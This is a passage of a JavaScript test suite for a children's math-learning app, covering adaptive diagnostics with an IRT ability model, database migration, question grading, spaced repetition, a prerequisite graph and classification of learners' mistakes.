    const kid = (await post(c, "/learners", { name: "Diag Kid" })).body.learner;

    /* Answer everything correctly: difficulty should climb through the tiers. */
    let r = await post(c, "/diagnostic/start", { learnerId: kid.id, topicId: "g6-nscoord" });
    assert(r.status === 200, "diagnostic did not start");
    const diagId = r.body.diagnosticId;
    const raw = JSON.stringify(r.body.question);
    for (const k of ['"ans"', '"ansP"', '"expl"', '"a":'])
      assert(!raw.includes(k), `diagnostic leaked ${k}`);

    const solve = q => correctAnswerFor(q.id);

    let q = r.body.question, guard = 0, summary = null;
    while (guard++ < 30) {
      const ans = await solve(q);
      const step = await post(c, "/diagnostic/answer", { diagnosticId: diagId, answer: ans });
      assert(step.status === 200, "diagnostic answer rejected");
      assert(step.body.correct === true, "a known-correct answer was marked wrong");
      if (step.body.done) { summary = step.body.summary; break; }
      q = step.body.question;
    }
    assert(summary, "diagnostic never completed");
    assert(summary.overall === 100, `all-correct run scored ${summary.overall}%`);
    assert(summary.skillMap.length > 0, "no skill map produced");
    assert(summary.skillMap.every(s => s.level && s.name), "skill map entries are malformed");
    assert(summary.recommendation.tier, "no placement tier recommended");
    assert(summary.reliable === true, `only ${summary.asked} questions asked; too few to place`);

    /* A spent diagnostic cannot be reused. */
    const replay = await post(c, "/diagnostic/answer", { diagnosticId: diagId, answer: 0 });
    assert(replay.status === 404, "a finished diagnostic accepted more answers");

    /* The result is retrievable afterwards. */
    const saved = (await c(`/learners/${kid.id}/diagnostic`)).body.diagnostic;
    assert(saved && saved.recommendation, "diagnostic result was not stored");
    assert(saved.skillMap.length === summary.skillMap.length, "stored skill map differs");

    /* A weak learner must be placed lower than a strong one. */
    const c2 = client();
    await post(c2, "/auth/register",
      { coppaConsent: true, email: "diag2@b.com", password: "a-long-enough-pass", name: "D2" });
    const kid2 = (await post(c2, "/learners", { name: "Weak Kid" })).body.learner;
    let r2 = await post(c2, "/diagnostic/start", { learnerId: kid2.id, topicId: "g6-nscoord" });
    let s2 = null, g2 = 0;
    while (g2++ < 30) {
      const step = await post(c2, "/diagnostic/answer",
        { diagnosticId: r2.body.diagnosticId, answer: "-999999" });
      if (step.body.done) { s2 = step.body.summary; break; }
    }
    assert(s2, "weak diagnostic never completed");
    assert(s2.overall === 0, `all-wrong run scored ${s2.overall}%`);
    assert(s2.recommendation.tier === "practice", `weak learner placed at ${s2.recommendation.tier}`);
    assert(s2.skillMap.every(x => x.level === "needs work"), "weak learner shows a secure section");

    return `adaptive over ${summary.asked} questions, skill map + placement stored, replay blocked, weak/strong placed differently`;
  },

  /* 6.1 — Item Response Theory, not a streak rule wearing its name.

     Each assertion below targets a property the streak rule cannot express,
     so this check fails if the model is removed or quietly reverted. */
  "irt-adaptive": async () => {
    const irt = await import("../app/server/src/irt.js");

    const free = irt.itemParams({ lvl: 2, type: "in" });
    const mc4 = irt.itemParams({ lvl: 2, type: "mc", opts: ["a", "b", "c", "d"] });

    /* 1. The estimator stays finite exactly where maximum likelihood gives up.

       All-correct and all-wrong response patterns have no interior maximum —
       MLE runs off to infinity — and both are ordinary in a twelve-question
       diagnostic. An estimator that returns Infinity or NaN here would place
       a child on a number that is not a number. */
    const allRight = irt.estimateAbility(Array.from({ length: 10 }, () => ({ item: free, correct: true })));
    const allWrong = irt.estimateAbility(Array.from({ length: 10 }, () => ({ item: free, correct: false })));
    for (const [name, e] of [["all-correct", allRight], ["all-wrong", allWrong]]) {
      assert(Number.isFinite(e.theta), `${name} ability estimate was ${e.theta}`);
      assert(Number.isFinite(e.se) && e.se > 0, `${name} standard error was ${e.se}`);
      assert(Math.abs(e.theta) < 4, `${name} ability ran to the edge of the grid (${e.theta})`);
    }
    assert(allRight.theta > allWrong.theta + 1, "answering everything right did not out-rank answering everything wrong");

    /* With no evidence at all the estimate is the prior, not a guess. */
    const cold = irt.estimateAbility([]);
    assert(Math.abs(cold.theta) < 0.01 && Math.abs(cold.se - 1) < 0.02,
      `cold start should be the prior, got theta ${cold.theta} se ${cold.se}`);

    /* 2. A guessable correct answer is weaker evidence than an unguessable one.

       Six correct four-option questions can happen by luck roughly once in
       4,000; six correct free-input answers essentially cannot. The streak
       rule counted both as three promotions. */
    assert(mc4.c === 0.25, `four-option guessing floor is ${mc4.c}`);
    assert(free.c === 0, `free-input guessing floor is ${free.c}`);
    assert(irt.guessingFloor({ type: "order", items: [1, 2, 3, 4] }) < 0.05, "ordering four items is treated as guessable");
    const viaMc = irt.estimateAbility(Array.from({ length: 6 }, () => ({ item: mc4, correct: true }))).theta;
    const viaFree = irt.estimateAbility(Array.from({ length: 6 }, () => ({ item: free, correct: true }))).theta;
    assert(viaFree > viaMc + 0.15,
      `guessing is not discounted: six correct scored ${viaMc.toFixed(2)} on multiple choice vs ${viaFree.toFixed(2)} on free input`);

    /* 3. Selection aims difficulty at the learner, in BOTH directions.

       This is a regression that actually happened. Grading discrimination by
       tier (0.8/1.0/1.2) made information scale with a-squared in favour of
       hard items, so the selector served middle and boss questions to a
       learner of ability -1.5, never asked an easy one, and placed a
       struggling child at "challenge". Pinned in both directions because the
       broken version still looked correct for strong learners. */
    const candidates = () => [1, 2, 3].map(lvl => ({ lvl, item: irt.itemParams({ lvl, type: "in" }) }));

    /* Swept rather than spot-checked, and that is the whole point of this
       assertion. The first version of it probed ability -1.5 and 1.5, both of
       which the broken gradient happened to get right, so it passed against
       the very bug it was written to catch. The gradient goes wrong in a band
       either side of the middle — at -1.25, -1.0, -0.75, 0.25 and 0.5 — which
       two convenient sample points walked straight past.

       The property that actually holds is an equality: with discrimination
       uniform, the most informative item is always the one nearest the
       learner in difficulty. Any per-tier weighting breaks it somewhere, so
       sweeping the range catches it wherever it breaks. */
    const sweep = [];
    for (let theta = -3; theta <= 3.001; theta += 0.25) sweep.push(Number(theta.toFixed(2)));
    const mismatched = [];
    for (const theta of sweep) {
      const chosen = irt.selectNext(theta, candidates());
      const nearest = candidates().reduce((best, cand) =>
        Math.abs(cand.item.b - theta) < Math.abs(best.item.b - theta) ? cand : best);
      if (chosen.item.b !== nearest.item.b)
        mismatched.push(`theta ${theta}: served b=${chosen.item.b}, nearest was b=${nearest.item.b}`);
    }
    assert(mismatched.length === 0,
      `most-informative is not nearest-difficulty at ${mismatched.length}/${sweep.length} abilities — ${mismatched.slice(0, 3).join("; ")}`);

    /* And the direction holds at the extremes, which is the harm in plain
       terms: a struggling learner must be handed something easier, not the
       middle of the bank. */
    assert(irt.selectNext(-2, candidates()).item.b < 0, "a struggling learner was not served an easier item");
    assert(irt.selectNext(2, candidates()).item.b > 0, "a strong learner was not served a harder item");

    /* Information must peak at the learner the item is aimed at, which is
       what makes "most informative" mean "best targeted". */
    const boss = irt.itemParams({ lvl: 3, type: "in" });
    assert(irt.information(boss.b, boss) > irt.information(boss.b - 2, boss)
        && irt.information(boss.b, boss) > irt.information(boss.b + 2, boss),
      "information does not peak at the item's own difficulty");

    /* 4. Placement follows measured ability, not the raw percentage.

       Two learners, both exactly 50%: one half-right on boss items, one
       half-right on practice items. A percentage cannot tell them apart
       because it does not know what was asked. The model must, and must
       place them differently. */
    const practice = irt.itemParams({ lvl: 1, type: "in" });
    const half = item => [true, true, true, false, false, false].map(correct => ({ item, correct }));
    const hardHalf = irt.estimateAbility(half(boss)).theta;
    const easyHalf = irt.estimateAbility(half(practice)).theta;
    assert(hardHalf > easyHalf + 1,
      `same 50% scored the same either way (hard ${hardHalf.toFixed(2)} vs easy ${easyHalf.toFixed(2)})`);
    assert(irt.tierForAbility(hardHalf) !== irt.tierForAbility(easyHalf),
      `both 50% learners were placed at ${irt.tierForAbility(hardHalf)}`);

    /* 5. End to end: a real diagnostic reports the estimate and its error,
       and the reported uncertainty is honest rather than decorative. */
    const c = client();
    await post(c, "/auth/register",
      { coppaConsent: true, email: "irt@b.com", password: "a-long-enough-pass", name: "I" });
    const kid = (await post(c, "/learners", { name: "IRT Kid" })).body.learner;
    const start = await post(c, "/diagnostic/start", { learnerId: kid.id, topicId: "g6-nscoord" });
    assert(start.status === 200, "diagnostic did not start");

    let summary = null, guard = 0;
    while (guard++ < 30) {
      const step = await post(c, "/diagnostic/answer",
        { diagnosticId: start.body.diagnosticId, answer: "-999999" });
      if (step.body.done) { summary = step.body.summary; break; }
    }
    assert(summary, "diagnostic never completed");
    assert(typeof summary.ability === "number" && Number.isFinite(summary.ability),
      `diagnostic reported ability ${summary.ability}`);
    assert(typeof summary.abilityError === "number" && summary.abilityError > 0,
      `diagnostic reported error ${summary.abilityError}`);
    assert(summary.ability < -0.5,
      `a learner who answered everything wrong measured ${summary.ability}`);
    assert(summary.recommendation.tier === "practice",
      `all-wrong learner placed at ${summary.recommendation.tier}`);
    /* The uncertainty has to be reported as reached or not reached, and the
       message has to say so — a placement presented as settled when it is
       still provisional is worse than no number at all. */
    assert(typeof summary.measured === "boolean", "the diagnostic does not say whether it reached its target precision");
    if (!summary.measured)
      assert(/first estimate|may move/.test(summary.recommendation.message),
        "an unsettled placement is reported without saying so");

    return `3PL model: finite where MLE diverges, guessing discounted (mc ${viaMc.toFixed(2)} vs free ${viaFree.toFixed(2)}), difficulty targeted both ways, same 50% placed ${irt.tierForAbility(easyHalf)} vs ${irt.tierForAbility(hardHalf)} by item difficulty`;
  },

  /* 13.3 — the whole journey: diagnostic -> practice -> mastery check -> review */
  "end-to-end-flow": async () => {
    const c = client();
    await post(c, "/auth/register",
      { coppaConsent: true, email: "e2e@b.com", password: "a-long-enough-pass", name: "E" });
    const kid = (await post(c, "/learners", { name: "E2E Kid" })).body.learner;

    /* 1. diagnostic places the learner */
    const start = await post(c, "/diagnostic/start", { learnerId: kid.id, topicId: "g6-ratios" });
    let q = start.body.question, placed = null, guard = 0;
    while (guard++ < 30) {
      const step = await post(c, "/diagnostic/answer",
        { diagnosticId: start.body.diagnosticId, answer: "-999999" });
      if (step.body.done) { placed = step.body.summary.recommendation; break; }
      q = step.body.question;
    }
    assert(placed && placed.tier, "step 1: diagnostic produced no placement");

    /* 2. practice at the recommended tier, scoring badly on purpose */
    const qs = (await c(`/topics/g6-ratios/${placed.tier}/questions`)).body.questions;
    assert(qs.length, "step 2: no questions at the recommended tier");
    const run = await post(c, "/runs",
      { learnerId: kid.id, topicId: "g6-ratios", tier: placed.tier, score: 1, total: qs.length });
    assert(run.status === 200, "step 2: run not recorded");
    assert(run.body.star === false, "step 2: a poor run earned mastery");

    /* 3. review must now surface that topic as needing work */
    const review = (await c(`/learners/${kid.id}/review`)).body.review;
    assert(review.some(r => r.topicId === "g6-ratios"), "step 3: weak topic missing from review queue");
    assert(review[0].gap > 0, "step 3: review item has no gap to close");

    /* 4. mastery check, answered correctly, clears it */
    const chk = (await post(c, "/mastery/start", { learnerId: kid.id, topicId: "g6-ratios" })).body;
    const answers = {};
    for (const cq of chk.questions) {
      if (cq.type === "mc") {
        for (let i = 0; i < cq.opts.length; i++)
          if ((await post(c, "/answer", { questionId: cq.id, answer: i })).body.correct) { answers[cq.id] = i; break; }
      } else {
        answers[cq.id] = (await post(c, "/answer", { questionId: cq.id, answer: "__" })).body.correctAnswer;
      }
    }
    const done = await post(c, "/mastery/submit", { checkId: chk.checkId, answers });
    assert(done.body.passed === true, "step 4: perfect mastery check did not pass");

    /* 5. progress reflects the whole journey */
    const prog = (await c(`/learners/${kid.id}/progress`)).body;
    assert(prog.progress.some(p => p.tier === "mastery" && p.best_pct === 100), "step 5: mastery not recorded");
    assert(prog.recent.length >= 2, "step 5: run history incomplete");
    const diagStored = (await c(`/learners/${kid.id}/diagnostic`)).body.diagnostic;
    assert(diagStored, "step 5: diagnostic missing from the learner record");

    return "diagnostic -> practice -> review -> mastery check -> progress, all server-side";
  },


  /* X.5 — an EXISTING database must survive an upgrade.
     The rest of the suite always starts from an empty file, which is exactly
     why a missing migration went unnoticed until the dev database broke. This
     builds a database at the OLD schema, boots against it, and asserts the
     app still works and the old row is intact. */
  "schema-migration": async () => {
    const { DatabaseSync } = await import("node:sqlite");
    const { rmSync, mkdirSync } = await import("node:fs");
    const { spawn } = await import("node:child_process");

    const file = "app/server/data/legacy.db";
    mkdirSync("app/server/data", { recursive: true });
    rmSync(file, { force: true });
    rmSync(file + "-wal", { force: true });
    rmSync(file + "-shm", { force: true });

    /* The users table as it existed BEFORE role/coppa_consent_at were added. */
    const old = new DatabaseSync(file);
    old.exec(`CREATE TABLE users (
      id TEXT PRIMARY KEY, email TEXT NOT NULL UNIQUE, pass_hash TEXT NOT NULL,
      pass_salt TEXT NOT NULL, name TEXT NOT NULL, created_at TEXT NOT NULL)`);
    old.prepare("INSERT INTO users VALUES (?,?,?,?,?,?)")
       .run("legacy-1", "legacy@b.com", "deadbeef", "cafe", "Legacy User", new Date().toISOString());
    old.close();

    /* Boot a server against that old file on its own port. */
    const port = 4199;
    const srv = spawn("node", ["src/index.js"], {
      cwd: "app/server",
      env: { ...process.env, PORT: String(port), DB_FILE: "./data/legacy.db" },
      stdio: "ignore"
    });
    try {
      let up = false;
      for (let i = 0; i < 40 && !up; i++) {
        try { up = (await fetch(`http://localhost:${port}/health`)).ok; } catch {}
        if (!up) await new Promise(r => setTimeout(r, 150));
      }
      assert(up, "server failed to boot against a pre-existing database");

      /* The columns must now exist, and the old row must be preserved. */
      const db = new DatabaseSync(file);
      const cols = new Set(db.prepare("PRAGMA table_info(users)").all().map(c => c.name));
      assert(cols.has("role"), "migration did not add users.role");
      assert(cols.has("coppa_consent_at"), "migration did not add users.coppa_consent_at");
      const row = db.prepare("SELECT * FROM users WHERE id = ?").get("legacy-1");
      assert(row && row.name === "Legacy User", "existing user row was lost during migration");
      assert(row.role === "parent", `existing user got role "${row.role}", expected the default`);

      /* And the app must actually serve requests against the upgraded file. */
      const me = await fetch(`http://localhost:${port}/api/auth/me`);
      assert(me.ok, `auth/me failed after migration (status ${me.status})`);
      const reg = await fetch(`http://localhost:${port}/api/auth/register`, {
        method: "POST", headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ email: "after@b.com", password: "a-long-enough-pass", name: "After", coppaConsent: true })
      });
      assert(reg.ok, `registration failed on a migrated database (status ${reg.status})`);
      return "old database booted, columns added, existing row preserved, requests served";
    } finally {
      srv.kill();
    }
  },


  /* 3.2.2 — varied question types, all graded server-side */
  "question-types": async () => {
    const c = client();
    const qs = (await c("/topics/g6-percent/practice/questions")).body.questions;
    assert(qs.length, "percent bank did not load");

    const kinds = new Set(qs.map(q => q.type));
    for (const t of ["order", "multi"]) assert(kinds.has(t), `no ${t} question served`);

    /* Neither new type may leak its answer. */
    const raw = JSON.stringify(qs);
    for (const k of ['"ansOrder"', '"aMulti"', '"expl"', '"a":'])
      assert(!raw.includes(k), `question payload leaked ${k}`);

    /* Ordering: items are sent, and a wrong sequence is refused. */
    const ord = qs.find(q => q.type === "order");
    assert(Array.isArray(ord.items) && ord.items.length > 2, "ordering question has no items");
    const backwards = [...ord.items].reverse();
    const wrongOrder = await post(c, "/answer", { questionId: ord.id, answer: backwards });
    const rightOrder = await post(c, "/answer",
      { questionId: ord.id, answer: wrongOrder.body.correctAnswer.split("  →  ") });
    assert(rightOrder.body.correct === true, "the stated correct order was marked wrong");
    /* A reversed list can only coincidentally be right if the list is symmetric. */
    if (backwards.join() !== wrongOrder.body.correctAnswer.split("  →  ").join())
      assert(wrongOrder.body.correct === false, "a wrong order was accepted");

    /* Select-all: partial and over-selection must both fail. */
    const mul = qs.find(q => q.type === "multi");
    assert(Array.isArray(mul.opts) && mul.opts.length > 2, "multi question has no options");
    const all = mul.opts.map((_, i) => i);
    const everything = await post(c, "/answer", { questionId: mul.id, answer: all });
    assert(everything.body.correct === false, "selecting every option was accepted");
    const correctIdx = everything.body.correctAnswer.split(", ").map(t => mul.opts.indexOf(t));
    assert(correctIdx.every(i => i >= 0), "could not map the correct answer back to options");
    const exact = await post(c, "/answer", { questionId: mul.id, answer: correctIdx });
    assert(exact.body.correct === true, "the exact correct selection was marked wrong");
    if (correctIdx.length > 1) {
      const partial = await post(c, "/answer", { questionId: mul.id, answer: correctIdx.slice(0, -1) });
      assert(partial.body.correct === false, "a partial selection was accepted as correct");
    }
    /* Empty and malformed answers must not pass. */
    assert((await post(c, "/answer", { questionId: mul.id, answer: [] })).body.correct === false,
      "an empty selection was accepted");
    assert((await post(c, "/answer", { questionId: ord.id, answer: "nonsense" })).body.correct === false,
      "a malformed ordering answer was accepted");

    /* Ordering content invariant: the answer must be a permutation of the items. */
    const { QUESTIONS } = await import("../app/shared/questions.mjs");
    for (const [topic, bank] of Object.entries(QUESTIONS))
      bank.filter(q => q.type === "order").forEach((q, i) => {
        const a = [...q.items].sort().join("|"), b = [...q.ansOrder].sort().join("|");
        assert(a === b, `${topic} ordering question ${i + 1}: ansOrder is not a permutation of items`);
      });

    return `${kinds.size} question types served (${[...kinds].join(", ")}), partial/over/empty answers all refused`;
  },

  /* 3.2.8 — the three assessment kinds the spec names */
  "assessment-kinds": async () => {
    const c = client();
    await post(c, "/auth/register",
      { coppaConsent: true, email: "assess@b.com", password: "a-long-enough-pass", name: "A" });
    const kid = (await post(c, "/learners", { name: "Assess Kid" })).body.learner;

    /* diagnostic */
    const d = await post(c, "/diagnostic/start", { learnerId: kid.id, topicId: "g6-percent" });
    assert(d.status === 200 && d.body.question, "diagnostic assessment unavailable");

    /* formative — practice with immediate feedback and an explanation */
    const qs = (await c("/topics/g6-percent/practice/questions")).body.questions;
    const fb = await post(c, "/answer", { questionId: qs[0].id, answer: "definitely wrong" });
    assert(typeof fb.body.correct === "boolean" && fb.body.explanation,
      "formative feedback missing correctness or explanation");

    /* summative — mastery check */
    const m = await post(c, "/mastery/start", { learnerId: kid.id, topicId: "g6-percent" });
    assert(m.status === 200 && m.body.questions.length, "summative assessment unavailable");
    assert(typeof m.body.threshold === "number", "summative check has no pass mark");

    return "diagnostic, formative and summative assessments all reachable";
  },


  /* 4.1.4 — adaptive practice: difficulty follows performance, hints cost
     stars, and mistakes come back for review at the end */
  "adaptive-practice": async () => {
    const c = client();
    await post(c, "/auth/register",
      { coppaConsent: true, email: "prac@b.com", password: "a-long-enough-pass", name: "P" });
    const kid = (await post(c, "/learners", { name: "Practice Kid" })).body.learner;

    const solve = async q => {
      if (q.type === "mc") {
        for (let i = 0; i < q.opts.length; i++)
          if ((await post(c, "/answer", { questionId: q.id, answer: i })).body.correct) return i;
        return 0;
      }
      if (q.type === "multi") {
        const probe = await post(c, "/answer", { questionId: q.id, answer: [] });
        return probe.body.correctAnswer.split(", ").map(t => q.opts.indexOf(t));
      }
      if (q.type === "order") {
        const probe = await post(c, "/answer", { questionId: q.id, answer: [] });
        return probe.body.correctAnswer.split("  →  ");
      }
      return (await post(c, "/answer", { questionId: q.id, answer: "__" })).body.correctAnswer;
    };

    /* An all-correct session: full marks, 3 stars (no hints), nothing to review. */
    let r = await post(c, "/practice/start", { learnerId: kid.id, topicId: "g6-ratios" });
    assert(r.status === 200, "practice session did not start");
    assert(r.body.length > 1, "practice session has no length");
    let q = r.body.question, sum = null, guard = 0;
    while (guard++ < 30) {
      const step = await post(c, "/practice/answer",
        { sessionId: r.body.sessionId, answer: await solve(q), hintsUsed: 0 });
      assert(step.body.correct === true, "a solved question was marked wrong");
      if (step.body.done) { sum = step.body.summary; break; }
      q = step.body.question;
    }
    assert(sum, "practice session never finished");
    assert(sum.pct === 100, `all-correct session scored ${sum.pct}%`);
    assert(sum.stars === 3, `no hints used but earned ${sum.stars} stars`);
    assert(sum.missed.length === 0, "a perfect session reported mistakes");
    assert(typeof sum.seconds === "number", "session did not record time on task");

    /* An all-wrong session using hints: every miss returned for review, fewer stars. */
    const r2 = await post(c, "/practice/start", { learnerId: kid.id, topicId: "g6-ratios" });
    let sum2 = null, g2 = 0;
    while (g2++ < 30) {
      const step = await post(c, "/practice/answer",
        { sessionId: r2.body.sessionId, answer: "-999999", hintsUsed: 3 });
      if (step.body.done) { sum2 = step.body.summary; break; }
    }
    assert(sum2, "second session never finished");
    assert(sum2.pct === 0, `all-wrong session scored ${sum2.pct}%`);
    assert(sum2.stars === 1, `heavy hint use still earned ${sum2.stars} stars`);
    assert(sum2.missed.length === sum2.total, "not every mistake was returned for review");
    assert(sum2.missed.every(m => m.q && m.correctAnswer && m.explanation),
      "review items are missing the question, answer or explanation");

    /* Both sessions recorded against the learner. */
    const prog = (await c(`/learners/${kid.id}/progress`)).body.progress;
    const row = prog.find(p => p.tier === "adaptive" && p.topic_id === "g6-ratios");
    assert(row, "adaptive practice was not recorded");
    assert(row.best_pct === 100, `best kept as ${row.best_pct}, expected the higher score`);
    assert(row.runs === 2, `expected 2 sessions recorded, got ${row.runs}`);

    /* A finished session cannot be continued. */
    const stale = await post(c, "/practice/answer", { sessionId: r2.body.sessionId, answer: 0 });
    assert(stale.status === 404, "a completed practice session accepted another answer");

    /* Another account cannot drive this learner's session. */
    const bob = client();
    await post(bob, "/auth/register",
      { coppaConsent: true, email: "pracbob@b.com", password: "a-long-enough-pass", name: "B" });
    const hijack = await post(bob, "/practice/start", { learnerId: kid.id, topicId: "g6-ratios" });
    assert(hijack.status === 403, "another account started a session for someone else's learner");

    return "adaptive over 10 questions, stars reflect hint use, all mistakes returned, best score kept";
  },


  /* 3.3.3 + 6.4 — spaced repetition: intervals adapt to performance */
  "spaced-repetition": async () => {
    /* Create a real learner first: the schedule has a foreign key to it. */
    const c = client();
    await post(c, "/auth/register",
      { coppaConsent: true, email: "space@b.com", password: "a-long-enough-pass", name: "S" });
    const kid = (await post(c, "/learners", { name: "Spaced Kid" })).body.learner;
    const learner = kid.id;

    /* The scheduling maths is deterministic, so drive it directly rather than
       waiting real days. DB_FILE is set at the top of this file so this shares
       the server's database. */
    const spacing = await import("../app/server/src/spacing.js");

    const day = (n) => new Date(Date.UTC(2026, 0, 1 + n));
    /* Three good reviews: interval must grow each time. */
    const r1 = spacing.schedule(learner, "t-good", 1.0, day(0));
    const r2 = spacing.schedule(learner, "t-good", 1.0, day(1));
    const r3 = spacing.schedule(learner, "t-good", 1.0, day(4));
    assert(r1.intervalDays === 1, `first interval ${r1.intervalDays}, expected 1`);
    assert(r2.intervalDays > r1.intervalDays, "interval did not grow after a second success");
    assert(r3.intervalDays > r2.intervalDays, "interval did not grow after a third success");
    assert(r3.ease >= r1.ease, "ease fell despite perfect reviews");

    /* A failure collapses the interval and reduces ease. */
    const bad = spacing.schedule(learner, "t-good", 0.1, day(10));
    assert(bad.intervalDays === 1, `failed review kept a ${bad.intervalDays}-day interval`);
    assert(bad.ease < r3.ease, "ease did not drop after a lapse");
    assert(bad.lapses === 1, "lapse not counted");
    assert(bad.reps === 0, "repetition count not reset after a lapse");

    /* Ease has a floor, so repeated failure cannot drive it to zero. */
    let e = bad.ease;
    for (let i = 0; i < 12; i++) e = spacing.schedule(learner, "t-bad", 0, day(20 + i)).ease;
    assert(e >= 1.3, `ease fell below the floor: ${e}`);

    /* Due-ness is date-driven: nothing due today, everything due later. */
    const dueNow = spacing.due(learner, day(0)).map(r => r.topic_id);
    assert(!dueNow.includes("t-good"), "a topic reviewed today is already due again");
    const dueLater = spacing.due(learner, day(400)).map(r => r.topic_id);
    assert(dueLater.includes("t-good"), "a long-overdue topic never became due");

    /* And a real run through the API must create a schedule entry. */
    const run = await post(c, "/runs",
      { learnerId: kid.id, topicId: "g6-ratios", tier: "practice", score: 8, total: 8 });
    assert(run.body.nextReview && run.body.nextReview.dueAt, "a run did not schedule the next review");
    const rev = (await c(`/learners/${kid.id}/review`)).body;
    assert(Array.isArray(rev.schedule) && rev.schedule.length >= 1, "schedule not exposed on the review endpoint");
    assert(rev.schedule.some(r => r.topic_id === "g6-ratios"), "the run's topic is not on the schedule");
    assert(rev.review.every(r => r.reason), "review items do not say why they are listed");

    return "intervals grow on success, collapse on failure, ease floored at 1.3, schedule exposed via API";
  },


  /* 6.2 — prerequisite knowledge graph */
  "knowledge-graph": async () => {
    const { PREREQS, findCycle, prereqsOf, allPrereqs, unlockedBy } =
      await import("../app/shared/prereqs.mjs");
    const { CURRICULUM } = await import("../app/shared/curriculum.mjs");

    /* Every id on both sides of every edge must be a real topic. */
    const ids = new Set();
    for (const g of Object.values(CURRICULUM))
      for (const u of g.units) for (const t of u.topics) ids.add(t.id);
    for (const [k, vs] of Object.entries(PREREQS)) {
      assert(ids.has(k), `prereq graph references unknown topic "${k}"`);
      for (const v of vs) assert(ids.has(v), `"${k}" depends on unknown topic "${v}"`);
    }

    /* Acyclic, or the "what can I learn next" logic would never terminate. */
    const cycle = findCycle();
    assert(!cycle, `prerequisite cycle: ${cycle && cycle.join(" -> ")}`);

    /* No topic may depend on itself, directly or transitively. */
    for (const id of Object.keys(PREREQS))
      assert(!allPrereqs(id).has(id), `${id} transitively requires itself`);

    /* The dependencies the spec names explicitly must be present. */
    assert(allPrereqs("g4-clockmod").has("g4-divide"),
      "spec 6.2: modular arithmetic must require division with remainders");
    assert(allPrereqs("g4-combin").has("g3-multprin"),
      "spec 6.2: combinatorics must require the multiplication principle");

    /* Edges must cross grades, not merely restate grade order. */
    const gradeOf = id => { for (const [g, v] of Object.entries(CURRICULUM))
      for (const u of v.units) for (const t of u.topics) if (t.id === id) return g; };
    let crossGrade = 0;
    for (const [k, vs] of Object.entries(PREREQS))
      for (const v of vs) if (gradeOf(k) !== gradeOf(v)) crossGrade++;
    assert(crossGrade > 100, `only ${crossGrade} cross-grade edges; the graph is too shallow`);

    /* Coverage: advanced topics in particular must not be orphans. */
    const advanced = [];
    for (const g of Object.values(CURRICULUM))
      for (const u of g.units) if (u.track === "adv") for (const t of u.topics) advanced.push(t.id);
    const orphanAdv = advanced.filter(id => !PREREQS[id] && !unlockedBy(id).length);
    assert(orphanAdv.length === 0, `advanced topics with no graph edges: ${orphanAdv.slice(0, 5).join(", ")}`);

    /* Deep chains actually exist: RSA should sit on a long dependency chain. */
    assert(allPrereqs("g8-rsa").size > 20,
      `g8-rsa depends on only ${allPrereqs("g8-rsa").size} topics; chain is too shallow`);

    /* API: the graph is queryable, and recommendations respect it. */
    const c = client();
    const g = await c("/topics/g6-crt/prereqs");
    assert(g.status === 200 && g.body.direct.length, "prereq endpoint returned nothing");
    assert(g.body.direct.every(d => d.name), "prereq entries are not named");
    assert((await c("/topics/not-real/prereqs")).status === 404, "unknown topic accepted");

    await post(c, "/auth/register",
      { coppaConsent: true, email: "graph@b.com", password: "a-long-enough-pass", name: "G" });
    const kid = (await post(c, "/learners", { name: "Graph Kid" })).body.learner;
    const next = (await c(`/learners/${kid.id}/next`)).body;
    assert(Array.isArray(next.ready) && Array.isArray(next.blocked), "next endpoint malformed");
    /* A fresh learner has mastered nothing, so anything with prerequisites is blocked. */
    assert(next.blocked.length > 0, "a learner with no progress has nothing blocked");
    assert(next.blocked.every(b => b.missing.length), "a blocked topic lists no missing prerequisite");
    assert(next.ready.every(r => prereqsOf(r.topicId).length === 0),
      "a topic with unmet prerequisites was recommended as ready");

    return `${Object.keys(PREREQS).length} topics, ${Object.values(PREREQS).reduce((a, b) => a + b.length, 0)} edges, acyclic, ${crossGrade} cross-grade`;
  },


  /* 7.5 — error analysis: wrong answers are classified by misconception */
  "error-analysis": async () => {
    const { classify, CATEGORIES } = await import("../app/server/src/errors.js");

    /* The classifier, exercised directly against each mistake shape. */
    const cases = [
      [{ type: "in", ans: 50 }, "-50", "sign_error"],
      [{ type: "in", ans: 50 }, "500", "place_value"],
      [{ type: "in", ans: 50 }, "5", "place_value"],
      [{ type: "in", ans: 50 }, "51", "off_by_one"],
      [{ type: "in", ans: 50 }, "", "blank"],
      [{ type: "in", ans: 50 }, "37", "unclassified"],
      [{ type: "pair", ansP: [3, -2] }, "(-2, 3)", "reversed_pair"],
      [{ type: "pair", ansP: [3, -2] }, "(-3, 2)", "sign_error"],
      [{ type: "multi", aMulti: [0, 1, 2] }, [0, 1], "partial_selection"],
      [{ type: "multi", aMulti: [0, 1] }, [0, 1, 3], "over_selection"],
      [{ type: "order", ansOrder: ["a", "b", "c"] }, ["c", "b", "a"], "order_reversed"],
      [{ type: "order", ansOrder: ["a", "b", "c", "d"] }, ["b", "a", "c", "d"], "order_adjacent"],
      [{ type: "mc", opts: ["4 : 6", "6 : 4"], a: 0 }, 1, "operation_swap"]
    ];
    for (const [q, ans, want] of cases) {
      const got = classify(q, ans);
      assert(got === want, `classify(${q.type}, ${JSON.stringify(ans)}) = "${got}", expected "${want}"`);
    }
    /* A correct-looking but unrecognised mistake must NOT be forced into a bucket. */
    assert(classify({ type: "in", ans: 100 }, "73") === "unclassified",
      "an unrecognised mistake was given a category anyway");
    for (const [, , want] of cases) assert(CATEGORIES[want], `category "${want}" has no label`);

    /* End to end: mistakes made in a real session are recorded and reported. */
    const c = client();
    await post(c, "/auth/register",
      { coppaConsent: true, email: "errs@b.com", password: "a-long-enough-pass", name: "E" });
    const kid = (await post(c, "/learners", { name: "Error Kid" })).body.learner;

    const start = await post(c, "/practice/start", { learnerId: kid.id, topicId: "g6-ratios" });
    let done = false, guard = 0, lastMissed = null;
    while (!done && guard++ < 20) {
      const step = await post(c, "/practice/answer",
        { sessionId: start.body.sessionId, answer: "", hintsUsed: 0 });   // blank every time
      if (step.body.done) { done = true; lastMissed = step.body.summary.missed; }
    }
    assert(lastMissed && lastMissed.length, "no mistakes recorded from an all-blank session");
    assert(lastMissed.every(m => m.category), "a recorded mistake has no category");
    assert(lastMissed.some(m => m.category === "blank"), "blank answers were not classified as blank");
    assert(lastMissed.every(m => m.categoryLabel), "mistake categories have no human-readable label");

    const report = (await c(`/learners/${kid.id}/errors`)).body;
    assert(report.total > 0, "error report is empty after a failed session");
    assert(report.byCategory.length > 0, "no category breakdown produced");
    assert(report.byCategory[0].count >= report.byCategory[report.byCategory.length - 1].count,
      "category breakdown is not ordered by frequency");
